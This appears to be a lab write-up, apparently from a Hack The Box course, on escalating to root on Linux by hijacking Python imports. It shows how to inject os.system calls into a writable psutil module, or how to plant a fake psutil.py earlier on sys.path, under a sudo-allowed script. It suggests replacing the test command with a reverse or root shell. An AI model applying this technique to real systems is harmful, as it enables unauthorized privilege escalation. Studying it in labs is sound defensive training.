To use this method, we first need to check if we can run any python scripts with sudo permission
```
sudo -l

Matching Defaults entries for htb-student on lpenix:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on lpenix:
    (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py
```

Next step is to check mem_status.py, if we have write permission to it, we can directly write our payload to it, but if we can't, we are interested in reading it to see if we have any part that we can alter, assuming if we have ability to read it and discovered the following:
```
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / 
<snip>
```

We next check if where the package is located, and if we have write permission to it:
```
htb-student@lpenix:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():


htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

If we have write permission, we go to the referenced function and edit it, it is best we place our payload at the beginning:
```
def virtual_memory():

    ...SNIP...
    #### Hijacking
    import os
    os.system('id')
    

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret
```
After confirming, we can change the command id into something like reverse shell or spawn root shell.

If we can't alter the scripts, we can also attempt to hijack the whole script completely:
```
htb-student@lpenix:~$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

Python import modules based on priority system, that means the module is loaded with preference from entry higher in the above, to hijack, we have 2 prerequisite:

1.The original referenced file is located at somewhere at lower priority
2.We have write permission to one of the paths that has higher priority


We can see a module default installation location by issuing this command:
```
pip3 show <modulename>
```

Assuming the interested module is installed at /usr/lib/python3/dist-packages, now we have 4 candidates and we only need one directory that we have write access to:
```
htb-student@lpenix:~$ ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
...SNIP...
```

now we can create our own module, using previous example of psutil:
```
cat psutil.py

#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

We run the script again, if hijack is successful, we change payload to something else.